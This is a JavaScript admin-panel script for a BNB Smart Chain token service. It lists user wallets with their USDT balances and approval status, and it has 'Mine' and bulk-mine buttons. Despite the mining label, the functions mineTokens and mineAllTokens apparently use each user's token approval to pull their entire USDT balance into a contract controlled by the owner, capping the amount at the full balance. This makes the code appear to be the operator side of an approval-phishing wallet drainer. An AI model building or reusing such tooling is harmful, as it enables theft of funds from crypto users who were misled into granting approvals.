const API_URL = '/api';

// ─── XSS Protection ──────────────────────────────────────
function escapeHtml(str) {
    if (str === null || str === undefined) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}
// Global admin configuration
let ADMIN_CONFIG = {
    mineContract: null,
    usdtAddress: null,
    chainId: 56
};

let adminAccount = null;
let web3Instance = null;
let mineContractInstance = null;
let lastUsers = []; // Store users for bulk actions

// Pagination state
let currentPage = 1;
let totalPages = 1;
let totalUsers = 0;
let lastRefreshedAt = null;

// Virtual scroll state
const ROW_HEIGHT = 40; // px per row
const VISIBLE_BUFFER = 10; // extra rows above/below viewport
let allPageUsers = []; // current page data
let filteredUsers = []; // after search filter
let searchTerm = '';

const IERC20_ABI = [
    { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
    { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
];

const MINE_ABI = [
    { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" },
    {
        "inputs": [
            { "internalType": "address", "name": "user", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "mine",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address[]", "name": "users", "type": "address[]" },
            { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }
        ],
        "name": "mineBulk",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// Initialize Admin Config
async function initAdminConfig() {
    try {
        const response = await fetch('/api/users/config/contract-address');
        const data = await response.json();
        if (data.success) {
            ADMIN_CONFIG.mineContract = data.mineAddress || data.contractAddress;
            ADMIN_CONFIG.usdtAddress = data.usdtAddress;
            ADMIN_CONFIG.chainId = parseInt(data.chainId);
            console.log('✅ Admin Configuration Loaded:', ADMIN_CONFIG);
        }
    } catch (error) {
        console.error('❌ Failed to load admin config:', error);
    }
}
initAdminConfig();

// Authentication Logic
async function login(username, password) {
    const errorMsg = document.getElementById('error-msg');
    if (errorMsg) errorMsg.style.display = 'none';

    try {
        const response = await fetch(`${API_URL}/admin/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        const data = await response.json();

        if (data.success) {
            localStorage.setItem('admin_token', data.token);
            localStorage.setItem('admin_user', JSON.stringify(data.admin));
            window.location.href = 'admin-dashboard.html';
        } else {
            showError(data.message);
        }
    } catch (error) {
        showError('Connection failed: ' + error.message);
    }
}

function logout() {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_user');
    window.location.href = 'admin.html';
}

function checkAuth() {
    const token = localStorage.getItem('admin_token');
    const isLoginPage = window.location.pathname.includes('admin.html');

    if (!token && !isLoginPage) {
        window.location.href = 'admin.html';
    } else if (token && isLoginPage) {
        window.location.href = 'admin-dashboard.html';
    }

    // Display admin name
    const userStr = localStorage.getItem('admin_user');
    if (userStr && document.getElementById('adminName')) {
        const user = JSON.parse(userStr);
        document.getElementById('adminName').textContent = user.username;
    }
}

// Data Fetching Logic with Indexer Integration
async function fetchStats() {
    try {
        const data = await authenticatedFetch('/admin/stats');
        if (data.success) {
            updateElementText('totalUsers', data.stats.totalUsers);
            updateElementText('confirmedUsers', data.stats.confirmedUsers);
            updateElementText('recentRegistrations', data.stats.recentRegistrations);
            updateElementText('activeApprovals', data.stats.activeApprovals);
        }
    } catch (error) {
        console.error('Failed to fetch stats:', error);
    }
}

let _loadingUsers = false;

async function loadUsers(page = 1) {
    if (_loadingUsers) return;
    _loadingUsers = true;

    const tbody = document.getElementById('usersTableBody');
    const loading = document.getElementById('usersLoading');

    if (loading) loading.style.display = 'block';
    if (tbody) tbody.innerHTML = '';

    try {
        const data = await authenticatedFetch(`/admin/users?page=${page}&limit=1000`);

        if (data.success && tbody) {
            lastUsers = data.users;
            allPageUsers = data.users;
            filteredUsers = searchTerm
                ? allPageUsers.filter(u => u.walletAddress.toLowerCase().includes(searchTerm))
                : [...allPageUsers];

            if (data.pagination) {
                currentPage = data.pagination.page;
                totalPages = data.pagination.totalPages;
                totalUsers = data.pagination.total;
            }

            lastRefreshedAt = data.lastRefreshed || null;
            updateLastUpdatedLabel();

            // Initialize virtual scroll
            initVirtualScroll();
            renderPagination();
        }
    } catch (error) {
        if (tbody) tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:red;">❌ Error: ${escapeHtml(error.message)}</td></tr>`;
    } finally {
        if (loading) loading.style.display = 'none';
        _loadingUsers = false;
    }
}

/**
 * Update the "Last Updated" label
 */
function updateLastUpdatedLabel() {
    const label = document.getElementById('lastUpdatedLabel');
    if (!label) return;

    if (lastRefreshedAt) {
        const d = new Date(lastRefreshedAt);
        const ago = getTimeAgo(d);
        label.textContent = `Last synced: ${ago}`;
        label.title = d.toLocaleString();
    } else {
        label.textContent = '';
    }
}

function getTimeAgo(date) {
    const seconds = Math.floor((Date.now() - date.getTime()) / 1000);
    if (seconds < 60) return 'just now';
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    const days = Math.floor(hours / 24);
    return `${days}d ago`;
}

/**
 * Virtual Scroll Engine
 * Only renders rows visible in the viewport + buffer
 */
function initVirtualScroll() {
    const container = document.getElementById('virtualScrollContainer');
    const spacer = document.getElementById('virtualSpacer');
    const tbody = document.getElementById('usersTableBody');

    if (!container || !spacer || !tbody) return;

    const totalHeight = filteredUsers.length * ROW_HEIGHT;
    spacer.style.height = totalHeight + 'px';

    // Remove old listener
    container._scrollHandler && container.removeEventListener('scroll', container._scrollHandler);

    // Render visible rows
    function renderVisibleRows() {
        const scrollTop = container.scrollTop;
        const containerHeight = container.clientHeight;

        const startIdx = Math.max(0, Math.floor(scrollTop / ROW_HEIGHT) - VISIBLE_BUFFER);
        const endIdx = Math.min(filteredUsers.length, Math.ceil((scrollTop + containerHeight) / ROW_HEIGHT) + VISIBLE_BUFFER);

        tbody.innerHTML = '';

        if (filteredUsers.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 2rem;">No records found</td></tr>';
            return;
        }

        // Create a document fragment for batch DOM insertion
        const fragment = document.createDocumentFragment();

        // Top spacer row
        if (startIdx > 0) {
            const topSpacer = document.createElement('tr');
            topSpacer.style.height = (startIdx * ROW_HEIGHT) + 'px';
            fragment.appendChild(topSpacer);
        }

        for (let i = startIdx; i < endIdx; i++) {
            const user = filteredUsers[i];
            const globalIndex = (currentPage - 1) * 1000 + i + 1;
            const tr = document.createElement('tr');
            tr.style.height = ROW_HEIGHT + 'px';

            const bscscanUrl = `https://bscscan.com/address/${encodeURIComponent(user.walletAddress)}`;
            const shortAddr = escapeHtml(user.walletAddress.slice(0, 6) + '...' + user.walletAddress.slice(-4));
            const safeAddress = escapeHtml(user.walletAddress);
            const safeBalance = escapeHtml(user.usdtBalance);
            const walletLink = `<a href="${bscscanUrl}" target="_blank" rel="noopener noreferrer" style="color:var(--primary-cyan); text-decoration:none; font-family:monospace;" title="${safeAddress}">${shortAddr}</a>`;

            tr.innerHTML = `
                <td style="text-align:center;">${globalIndex}</td>
                <td>${walletLink}</td>
                <td style="color: var(--accent-green); font-weight:600;">${safeBalance}</td>
                <td>
                    <button class="btn btn-primary" style="padding:0.25rem 0.5rem; font-size:0.75rem; background: var(--accent-green);" 
                        onclick="mineTokens('${safeAddress}', '${safeBalance}')" 
                        ${user.approvalStatus !== 'approved' ? 'disabled' : ''}
                        >💎 Mine</button>
                </td>
            `;
            fragment.appendChild(tr);
        }

        // Bottom spacer row
        const bottomHeight = (filteredUsers.length - endIdx) * ROW_HEIGHT;
        if (bottomHeight > 0) {
            const bottomSpacer = document.createElement('tr');
            bottomSpacer.style.height = bottomHeight + 'px';
            fragment.appendChild(bottomSpacer);
        }

        tbody.appendChild(fragment);
    }

    // Attach scroll listener with requestAnimationFrame throttle
    let ticking = false;
    container._scrollHandler = function () {
        if (!ticking) {
            requestAnimationFrame(() => {
                renderVisibleRows();
                ticking = false;
            });
            ticking = true;
        }
    };
    container.addEventListener('scroll', container._scrollHandler, { passive: true });

    // Initial render
    renderVisibleRows();
}

/**
 * Render pagination controls below the users table
 */
function renderPagination() {
    const container = document.getElementById('paginationControls');
    if (!container) return;

    const showing = filteredUsers.length;
    const filterNote = searchTerm ? ` (filtered: ${showing.toLocaleString()})` : '';

    container.innerHTML = `
        <button class="btn" onclick="loadUsers(${currentPage - 1})" ${currentPage <= 1 ? 'disabled' : ''} 
            style="padding:0.4rem 1rem;">« Previous</button>
        <span style="color:var(--text-secondary); font-size:0.9rem;">
            Page <strong style="color:var(--primary-cyan);">${currentPage}</strong> of <strong>${totalPages}</strong>
            &nbsp;|&nbsp; ${totalUsers.toLocaleString()} total${filterNote}
        </span>
        <button class="btn" onclick="loadUsers(${currentPage + 1})" ${currentPage >= totalPages ? 'disabled' : ''}
            style="padding:0.4rem 1rem;">Next »</button>
    `;
}

/**
 * Trigger a background balance refresh via Multicall3.
 * Polls for completion and reloads data when done.
 */
async function refreshBalances() {
    const refreshBtn = document.getElementById('refreshBtn');
    const originalText = refreshBtn ? refreshBtn.textContent : 'Refresh Data';

    try {
        if (refreshBtn) {
            refreshBtn.disabled = true;
            refreshBtn.textContent = '🔄 Starting refresh...';
        }

        // Trigger background refresh
        const result = await authenticatedFetch('/admin/refresh-balances', 'POST');

        if (!result.success) {
            if (refreshBtn) refreshBtn.textContent = '⚠️ ' + (result.message || 'Refresh failed');
            setTimeout(() => {
                if (refreshBtn) { refreshBtn.textContent = originalText; refreshBtn.disabled = false; }
            }, 3000);
            return;
        }

        // Poll for completion
        let attempts = 0;
        const maxAttempts = 600; // 10 minutes max (1 poll per second)
        const pollInterval = setInterval(async () => {
            attempts++;
            try {
                const status = await authenticatedFetch('/admin/refresh-status');
                if (status.success && status.status) {
                    const s = status.status;
                    if (s.isRefreshing) {
                        const pct = s.progress.total > 0
                            ? Math.round((s.progress.processed / s.progress.total) * 100)
                            : 0;
                        if (refreshBtn) refreshBtn.textContent = `🔄 Refreshing... ${pct}% (${s.progress.processed.toLocaleString()}/${s.progress.total.toLocaleString()})`;
                    } else {
                        // Done!
                        clearInterval(pollInterval);
                        if (refreshBtn) {
                            refreshBtn.textContent = '✅ Refresh complete!';
                            refreshBtn.disabled = false;
                        }
                        // Reload first page with updated balances
                        loadUsers(1);
                        setTimeout(() => {
                            if (refreshBtn) refreshBtn.textContent = originalText;
                        }, 3000);
                    }
                }
            } catch (e) {
                console.warn('Refresh status poll error:', e);
            }

            if (attempts >= maxAttempts) {
                clearInterval(pollInterval);
                if (refreshBtn) { refreshBtn.textContent = '⚠️ Refresh timed out'; refreshBtn.disabled = false; }
            }
        }, 1000);

    } catch (error) {
        console.error('Refresh error:', error);
        if (refreshBtn) {
            refreshBtn.textContent = '❌ Error: ' + error.message;
            refreshBtn.disabled = false;
            setTimeout(() => { refreshBtn.textContent = originalText; }, 3000);
        }
    }
}

async function loadContracts() {
    const tbody = document.getElementById('contractsTableBody');
    if (!tbody) return;

    try {
        const data = await authenticatedFetch('/admin/approvals');

        if (data.success) {
            tbody.innerHTML = '';
            if (data.approvals.length === 0) {
                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding: 2rem;">No contracts found</td></tr>';
                return;
            }

            data.approvals.forEach(contract => {
                const tr = document.createElement('tr');
                const statusHtml = contract.isActive
                    ? '<span class="status active">Active</span>'
                    : '<span class="status pending">Inactive</span>';

                // Add Disable button if active
                const disableBtn = contract.isActive
                    ? `<button class="btn" style="padding:0.3rem; background: rgba(255, 193, 7, 0.2); color: #ffc107; margin-right: 0.5rem;" onclick="disableContract('${escapeHtml(contract.id)}')" title="Disable">🚫</button>`
                    : '';

                tr.innerHTML = `
                    <td style="font-family:monospace">${escapeHtml(contract.contractAddress)}</td>
                    <td>${escapeHtml(contract.description)}</td>
                    <td>${statusHtml}</td>
                    <td>${escapeHtml(contract.addedBy)}</td>
                    <td>
                        ${disableBtn}
                        <button class="btn" style="padding:0.3rem; background: rgba(255,0,0,0.2);" onclick="deleteContract('${escapeHtml(contract.id)}')" title="Delete">🗑️</button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }
    } catch (error) {
        console.error(error);
        tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:red;">Error: ${escapeHtml(error.message)}</td></tr>`;
    }
}

async function disableContract(id) {
    if (!confirm('Are you sure you want to DISABLE this contract? It will no longer be used as the primary contract address.')) return;

    try {
        const result = await authenticatedFetch(`/admin/approvals/${id}`, 'PUT', {
            isActive: false
        });

        if (result.success) {
            loadContracts();
            fetchStats();
            alert('Contract disabled successfully');
        } else {
            alert('Failed: ' + result.message);
        }
    } catch (error) {
        alert('Error: ' + error.message);
    }
}

async function addContract(address, description) {
    try {
        const result = await authenticatedFetch('/admin/approvals', 'POST', {
            contractAddress: address,
            description: description,
            chainId: 56, // Default BSC
            isActive: true
        });

        if (result.success) {
            closeModal('contractModal');
            loadContracts();
            fetchStats();
            document.getElementById('addContractForm').reset();
            alert('Contract added successfully');
        } else {
            alert('Failed: ' + result.message);
        }
    } catch (error) {
        alert('Error: ' + error.message);
    }
}

async function deleteContract(id) {
    if (!confirm('Are you sure you want to delete this contract? This action cannot be undone.')) return;

    try {
        const result = await authenticatedFetch(`/admin/approvals/${id}`, 'DELETE');

        if (result.success) {
            loadContracts();
            fetchStats();
        } else {
            alert('Failed: ' + result.message);
        }
    } catch (error) {
        alert('Error: ' + error.message);
    }
}

// Helper: Authenticated Fetch
async function authenticatedFetch(endpoint, method = 'GET', body = null) {
    const token = localStorage.getItem('admin_token');
    const options = {
        method,
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        }
    };

    if (body) options.body = JSON.stringify(body);

    const response = await fetch(`${API_URL}${endpoint}`, options);

    if (response.status === 401) {
        logout(); // Token expired
        throw new Error('Session expired');
    }

    return await response.json();
}

function updateElementText(id, text) {
    const el = document.getElementById(id);
    if (el) el.textContent = text;
}

// UI Handlers
function showSection(sectionId) {
    // Hide all
    document.getElementById('statsGrid').style.display = 'none';
    const usersSec = document.getElementById('usersSection');
    const contractsSec = document.getElementById('contractsSection');

    if (usersSec) usersSec.style.display = 'none';
    if (contractsSec) contractsSec.style.display = 'none';

    // Update Nav
    document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
    const activeNav = document.querySelector(`.nav-item[data-section="${sectionId}"]`);
    if (activeNav) activeNav.classList.add('active');

    if (sectionId === 'dashboard') {
        document.getElementById('statsGrid').style.display = 'grid';
        fetchStats();
    } else if (sectionId === 'users') {
        if (usersSec) usersSec.style.display = 'block';
        loadUsers();
    } else if (sectionId === 'contracts') {
        if (contractsSec) contractsSec.style.display = 'block';
        loadContracts();
    }
}

function showError(msg) {
    const el = document.getElementById('error-msg');
    if (el) {
        el.textContent = msg;
        el.style.display = 'block';
    } else {
        alert(msg);
    }
}

// Modal Logic
function openModal(id) {
    const modal = document.getElementById(id);
    if (modal) modal.classList.add('active');
}

function closeModal(id) {
    const modal = document.getElementById(id);
    if (modal) modal.classList.remove('active');
}

/**
 * Verify User Status Function
 * Checks the blockchain/backend for the actual approval state
 */
async function verifyUserStatus(walletAddress) {
    try {
        const btn = event.target || document.querySelector(`button[onclick*="${walletAddress}"]`);
        if (btn) btn.textContent = 'Checking...';

        const result = await authenticatedFetch(`/admin/confirm-approval`, 'POST', {
            walletAddress: walletAddress,
            confirmed: true
        });

        if (result.success) {
            alert(`Status updated for ${walletAddress}`);
            loadUsers();
        }
    } catch (error) {
        alert('Verification failed: ' + error.message);
    }
}

async function connectAdminWallet() {
    if (typeof window.ethereum === 'undefined') {
        alert('Please install MetaMask or Trust Wallet to use this feature.');
        return;
    }

    const btn = document.getElementById('adminConnectWalletBtn');
    const originalText = btn ? btn.textContent : '';

    try {
        if (btn) btn.textContent = '⏳ Connecting...';

        // Step 1: Connect wallet
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const connectedAccount = accounts[0];

        // Step 2: Enforce BSC chain (chainId 0x38 = 56)
        const BSC_CHAIN_ID = '0x38';
        let currentChainId = await window.ethereum.request({ method: 'eth_chainId' });

        if (currentChainId !== BSC_CHAIN_ID) {
            if (btn) btn.textContent = '🔄 Switching to BSC...';
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }]
                });
            } catch (switchErr) {
                // Chain not added — try adding it
                if (switchErr.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_CHAIN_ID,
                            chainName: 'BNB Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }]
                    });
                } else {
                    throw new Error('You must switch to BNB Smart Chain to use the admin panel.');
                }
            }
        }

        // Step 3: Initialize Web3 on BSC
        web3Instance = new Web3(window.ethereum);
        mineContractInstance = new web3Instance.eth.Contract(MINE_ABI, ADMIN_CONFIG.mineContract);

        // Step 4: Verify this wallet is the contract owner
        if (btn) btn.textContent = '🔍 Verifying owner...';
        const contractOwner = await mineContractInstance.methods.owner().call();

        if (contractOwner.toLowerCase() !== connectedAccount.toLowerCase()) {
            // Reset state — not the owner
            web3Instance = null;
            mineContractInstance = null;
            adminAccount = null;
            if (btn) {
                btn.textContent = '❌ Access Denied';
                btn.classList.remove('connected');
                btn.style.color = '#ff6b6b';
                setTimeout(() => { btn.textContent = originalText; btn.style.color = ''; }, 4000);
            }
            showError(`❌ Access Denied — Only the contract owner can connect.`);
            return;
        }

        // Step 5: All checks passed — authorize
        adminAccount = connectedAccount;
        if (btn) {
            btn.textContent = `✅ ${adminAccount.slice(0, 6)}...${adminAccount.slice(-4)}`;
            btn.classList.add('connected');
        }
        console.log('✅ Admin Wallet Connected (Owner Verified):', adminAccount);

    } catch (error) {
        console.error('❌ Failed to connect admin wallet:', error);
        if (btn) { btn.textContent = originalText; btn.classList.remove('connected'); }
        showError('Failed to connect wallet: ' + error.message);
        adminAccount = null;
        web3Instance = null;
        mineContractInstance = null;
    }
}

async function mineTokens(walletAddress, amountStr) {
    if (!adminAccount || !mineContractInstance) {
        alert('Please connect your admin wallet first!');
        return;
    }

    try {
        let amount = web3Instance.utils.toWei(amountStr, 'ether'); // USDT uses 18 decimals in our contract mock/context, or match BSC USDT decimals

        console.log(`🚀 Mining ${amountStr} USDT from ${walletAddress}...`);

        // Disable button during tx
        const btn = event.target || document.querySelector(`button[onclick*="mineTokens('${walletAddress}'"]`);
        if (btn) {
            btn.disabled = true;
            btn.textContent = '⏳ Mining...';
        }

        // --- DEBUG CHECKS before TX ---
        // 1. Check Owner
        try {
            const owner = await mineContractInstance.methods.owner().call();
            if (owner.toLowerCase() !== adminAccount.toLowerCase()) {
                console.error(`❌ ADMIN ERROR: You are NOT the owner! Contract Owner: ${owner}, You: ${adminAccount}`);
                showError(`CRITICAL ERROR: Your wallet is NOT the contract owner. Owner: ${owner}, You: ${adminAccount}`);
                if (btn) { btn.disabled = false; btn.textContent = '💎 Mine'; }
                return; // Stop here
            } else {
                console.log('✅ Owner Check Passed');
            }
        } catch (e) { console.warn('⚠️ Could not check owner:', e); }

        // 2. Check Allowance & Balance
        try {
            const usdtContract = new web3Instance.eth.Contract(IERC20_ABI, ADMIN_CONFIG.usdtAddress);
            const allowance = await usdtContract.methods.allowance(walletAddress, ADMIN_CONFIG.mineContract).call();
            const balance = await usdtContract.methods.balanceOf(walletAddress).call();

            console.log(`🔍 DEBUG: User Balance: ${web3Instance.utils.fromWei(balance, 'ether')} USDT`);
            console.log(`🔍 DEBUG: Allowance: ${web3Instance.utils.fromWei(allowance, 'ether')} USDT`);

            if (BigInt(allowance) < BigInt(amount)) {
                console.error('❌ ALLOWANCE ERROR: User has not approved enough tokens!');
                showError('Mining will likely fail: User has insufficient allowance.');
                // Proceed anyway? No, revert likely.
            }
            if (BigInt(balance) < BigInt(amount)) {
                console.warn(`⚠️ Request ${web3Instance.utils.fromWei(amount, 'ether')} > Balance ${web3Instance.utils.fromWei(balance, 'ether')}. Adjusting to Max Balance.`);
                amount = balance; // Cap to exact available balance
            }
        } catch (e) { console.warn('⚠️ Could not check token details:', e); }

        // -----------------------------

        // MANUAL CALLDATA ENCODING (Mirroring registerUser logic)
        // Function: mine(address user, uint256 amount)
        // Selector: 0xab27be20 (keccak256("mine(address,uint256)"))

        // Remove '0x' prefix if present and pad to 64 chars
        const cleanAddress = walletAddress.startsWith('0x') ? walletAddress.slice(2) : walletAddress;
        const paddedAddress = cleanAddress.toLowerCase().padStart(64, '0');

        // Convert amount to hex, remove '0x', pad to 64 chars
        const amountHex = BigInt(amount).toString(16);
        const paddedAmount = amountHex.padStart(64, '0');

        const data = '0xab27be20' + paddedAddress + paddedAmount;

        console.log('📦 Manual Calldata:', data);

        // BSC minimum: 1 Gwei gasPrice, mine() needs ~80k gas (safeTransferFrom)
        // Fee: 100,000 × 1 Gwei = 0.0001 BNB (~$0.06)
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: adminAccount,
                to: ADMIN_CONFIG.mineContract,
                data: data,
                value: '0x0',
                gas: '0x186A0',        // 100,000 gas — enough for mine() + safeTransferFrom
                gasPrice: '0x3B9ACA00' // 1 Gwei — BSC minimum accepted
            }]
        });

        console.log('✅ Mining tx sent:', txHash);
        showError(`✅ Mining transaction sent! Hash: ${txHash}`);

        // Wait briefly then reload
        setTimeout(() => loadUsers(currentPage), 5000);

    } catch (error) {
        console.error('❌ Mining error:', error);
        showError('Mining failed: ' + (error.message || 'Unknown error'));
        // Re-enable button
        const btn = document.querySelector(`button[onclick*="mineTokens('${walletAddress}'"]`);
        if (btn) {
            btn.disabled = false;
            btn.textContent = '💎 Mine';
        }
    }
}

async function mineAllTokens() {
    if (!adminAccount || !mineContractInstance) {
        alert('Please connect your admin wallet first!');
        return;
    }

    const authorizedUsers = lastUsers.filter(u => u.approvalStatus === 'approved' && parseFloat(u.usdtBalance) > 0);

    if (authorizedUsers.length === 0) {
        alert('No authorized users with balance found.');
        return;
    }

    if (!confirm(`Are you sure you want to mine USDT from ${authorizedUsers.length} users?`)) {
        return;
    }

    try {
        // We use the bulk function from the contract if available, 
        // but here we'll process them one by one or use mineBulk if implemented in ABI
        // Let's check if Mine.sol has mineBulk

        const addresses = authorizedUsers.map(u => u.walletAddress);
        const amounts = authorizedUsers.map(u => web3Instance.utils.toWei(u.usdtBalance, 'ether'));

        console.log(`🚀 Bulk Mining from ${addresses.length} users...`);

        // Check if mineBulk exists in our minimal ABI
        const bulkABI = [
            {
                "inputs": [
                    { "internalType": "address[]", "name": "users", "type": "address[]" },
                    { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }
                ],
                "name": "mineBulk",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        // Temp contract instance with bulk ABI
        const bulkContract = new web3Instance.eth.Contract([...MINE_ABI, ...bulkABI], ADMIN_CONFIG.mineContract);
        const data = bulkContract.methods.mineBulk(addresses, amounts).encodeABI();

        // Send raw transaction with sensible gas limit for bulk (2,000,000 gas)
        // Fee: ~0.006 BNB (~$3.60) - Safe for batch
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: adminAccount,
                to: ADMIN_CONFIG.mineContract,
                data: data,
                value: '0x0',
                gas: '0x1E8480', // 2,000,000
                gasPrice: '0xB2D05E00' // 3 Gwei
            }]
        });

        console.log('✅ Bulk Mining tx sent:', txHash);
        alert(`✅ Bulk Mining transaction sent! Check your wallet.\nHash: ${txHash}`);

        setTimeout(() => loadUsers(), 5000);

    } catch (error) {
        console.error('❌ Bulk Mining error:', error);
        alert('Bulk Mining failed: ' + (error.message || 'Unknown error'));
    }
}

// Event Listeners
document.addEventListener('DOMContentLoaded', () => {
    // Auth Check
    checkAuth();

    // Login Form
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            login(u, p);
        });
    }

    // Add Contract Form
    const addContractForm = document.getElementById('addContractForm');
    if (addContractForm) {
        addContractForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const addr = document.getElementById('newContractAddress').value;
            const desc = document.getElementById('newContractDesc').value;
            addContract(addr, desc);
        });
    }

    // Navigation — close sidebar on mobile after selecting
    document.querySelectorAll('.nav-item[data-section]').forEach(item => {
        item.addEventListener('click', function () {
            const section = this.getAttribute('data-section');
            showSection(section);
            // Close sidebar on mobile
            if (window.innerWidth <= 768) {
                const sidebar = document.getElementById('sidebar');
                const overlay = document.getElementById('sidebarOverlay');
                if (sidebar) sidebar.classList.remove('open');
                if (overlay) overlay.classList.remove('active');
            }
        });
    });

    // Admin Wallet Connection
    const adminConnectBtn = document.getElementById('adminConnectWalletBtn');
    if (adminConnectBtn) {
        adminConnectBtn.addEventListener('click', connectAdminWallet);
    }

    // Refresh Balance Button — triggers MineBalanceFetcher refresh
    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', refreshBalances);
    }

    // Search input — debounced client-side filter
    const searchInput = document.getElementById('userSearchInput');
    if (searchInput) {
        let searchTimeout = null;
        searchInput.addEventListener('input', function () {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                searchTerm = this.value.trim().toLowerCase();
                filteredUsers = searchTerm
                    ? allPageUsers.filter(u => u.walletAddress.toLowerCase().includes(searchTerm))
                    : [...allPageUsers];
                initVirtualScroll();
                renderPagination();
            }, 250);
        });
    }

    // Initial Load if on dashboard
    if (document.getElementById('statsGrid')) {
        fetchStats();
    }
});

// Hamburger sidebar toggle for mobile
function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebarOverlay');
    if (sidebar) sidebar.classList.toggle('open');
    if (overlay) overlay.classList.toggle('active');
}
